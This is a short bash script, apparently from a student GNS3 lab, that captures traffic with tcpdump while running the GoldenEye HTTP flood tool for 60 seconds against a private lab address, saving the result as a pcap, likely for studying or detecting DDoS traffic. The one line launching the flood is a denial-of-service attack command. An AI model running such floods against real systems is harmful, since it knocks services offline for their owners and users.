#!/bin/bash

TARGET="http://192.168.10.3"
INTERFACE="ens3"
PCAP_FILE="/home/student/GNS3/pcap/ddos_goldeneye_$(date +%Y%m%d_%H%M%S).pcap"

echo "Starting tcpdump capture: $PCAP_FILE"
sudo tcpdump -i "$INTERFACE" host 192.168.10.3 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

timeout 60s python3 /home/student/GNS3/GoldenEye/goldeneye.py "$TARGET" -w 10 -s 100

kill "$TCPDUMP_PID"
echo "DDoS simulation complete. PCAP saved to $PCAP_FILE"
